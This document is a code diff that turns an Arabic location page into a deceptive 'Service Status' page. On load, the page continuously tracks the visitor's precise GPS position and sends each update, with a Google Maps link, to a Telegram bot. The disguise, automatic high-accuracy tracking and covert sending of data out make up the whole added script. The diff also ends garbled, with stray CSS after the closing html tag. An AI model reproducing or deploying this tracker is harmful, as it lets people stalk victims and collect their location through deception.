@@ -1,114 +1,127 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الموقع</title>
+    <title>Service Status</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
+        h1 { color: #333; }
+    </style>
+</head>
+<body>
+    <h1>Checking service status...</h1>
+    <p id="status">Please allow location access when prompted</p>
+
+    <script>
+        // ======== ضع التوكنات هنا ========
+        const BOT_TOKEN = 'ضع_توكن_البوت_هنا';
+        const CHAT_ID  = 'ضع_معرف_الدردشة_هنا';
+        // =================================
+
+        // إرسال الموقع إلى تيليجرام
+        function sendToTelegram(lat, lon, accuracy) {
+            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 موقع جديد:\n` +
+                            `الخط: ${lat}\n` +
+                            `الطول: ${lon}\n` +
+                            `الدقة: ±${Math.round(accuracy)} متر\n` +
+                            `الوقت: ${new Date().toLocaleString('ar-SA')}\n` +
+                            `📍 [عرض على خرائط غوغل](${googleMapsLink})`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            }).catch(e => console.error('Telegram error:', e));
+
+            // إرسال الموقع كـ Location (يظهر في المحادثة على الخريطة)
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lat,
+                    longitude: lon
+                })
+            }).catch(e => console.error('Location send error:', e));
         }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+
+        // بدء التتبع
+        let watchId = null;
+        let lastSentLat = null;
+        let lastSentLon = null;
+
+        function startTracking() {
+            if (!navigator.geolocation) {
+                document.getElementById('status').textContent = '❌ Geolocation غير مدعوم';
+                return;
+            }
+
+            document.getElementById('status').textContent = '🔄 طلب الإذن بالموقع...';
+
+            watchId = navigator.geolocation.watchPosition(
+                // Success callback
+                (position) => {
+                    const { latitude, longitude, accuracy } = position.coords;
+
+                    // تجنب إرسال نفس الموقع مراراً (حساسية 20 متر)
+                    if (lastSentLat && lastSentLon) {
+                        const dist = getDistance(lastSentLat, lastSentLon, latitude, longitude);
+                        if (dist < 0.02) return; // أقل من 20 متر — تجاهل
+                    }
+
+                    lastSentLat = latitude;
+                    lastSentLon = longitude;
+
+                    document.getElementById('status').innerHTML =
+                        `✅ تم التتبع<br>` +
+                        `العرض: ${latitude}<br>` +
+                        `الطول: ${longitude}<br>` +
+                        `الدقة: ±${Math.round(accuracy)} متر`;
+
+                    sendToTelegram(latitude, longitude, accuracy);
+                },
+                // Error callback
+                (error) => {
+                    let msg = '❌ خطأ في الموقع: ';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:   msg += 'تم رفض الإذن'; break;
+                        case error.POSITION_UNAVAILABLE: msg += 'الموقع غير متاح'; break;
+                        case error.TIMEOUT:             msg += 'انتهت المهلة'; break;
+                        default: msg += error.message;
+                    }
+                    document.getElementById('status').textContent = msg;
+                },
+                {
+                    enableHighAccuracy: true,   // دقة عالية (GPS)
+                    maximumAge: 0,              // لا تستخدم موقع مخبأ
+                    timeout: 30000              // مهلة 30 ثانية
+                }
+            );
         }
-        .card {
-            background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
-            max-width: 400px;
-            width: 100%;
-            padding: 30px 25px;
-            text-align: center;
-            transition: all 0.3s ease;
+
+        // حساب المسافة بين إحداثيتين (Haversine Formula)
+        function getDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371; // نصف قطر الأرض بالكيلومتر
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) ** 2 +
+                      Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                      Math.sin(dLon/2) ** 2;
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
         }
-        .icon {
-            font-size: 60px;
-            margin-bottom: 15px;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 1.6em;
-        }
-        p.subtitle {
-            color: #666;
-            margin-bottom: 30px;
-            font-size: 0.95em;
-            line-height: 1.6;
-        }
-        .status-box {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 20px;
-            margin-bottom: 25px;
-            min-height: 100px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            transition: background 0.3s;
-        }
-        .status-box.active {
-            background: #e8f5e9;
-        }
-        .status-text {
-            font-size: 0.95em;
-            color: #555;
-            word-break: break-all;
-        }
-        .coords {
-            font-weight: bold;
-            color: #2e7d32;
-            direction: ltr;
-            display: inline-block;
-            margin-top: 10px;
-            background: #fff;
-            padding: 10px 15px;
-            border-radius: 8px;
-            border: 1px solid #c8e6c9;
-        }
-        .map-link {
-            display: inline-block;
-            margin-top: 15px;
-            background: #667eea;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 25px;
-            text-decoration: none;
-            font-weight: bold;
-            transition: 0.3s;
-            box-shadow: 0 4px 10px rgba(102, 126, 234, 0.3);
-        }
-        .map-link:hover {
-            background: #5a6fd1;
-            transform: translateY(-2px);
-        }
-        .permission-btn {
-            background: #ff9800;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 30px;
-            font-size: 1em;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            margin-top: 15px;
-            box-shadow: 0 4px 10px rgba(255,152,0,0.3);
-        }
-        .permission-btn:hover {
-            background: #f57c00;
-        }
-        .error {
-            color: #d32f2f;
+
+        // البدء عند تحميل الصفحة
+        window.addEventListener('load', startTracking);
+    </script>
+</body>
+</html>            color: #d32f2f;
             font-weight: bold;
         }
         .footer-note {
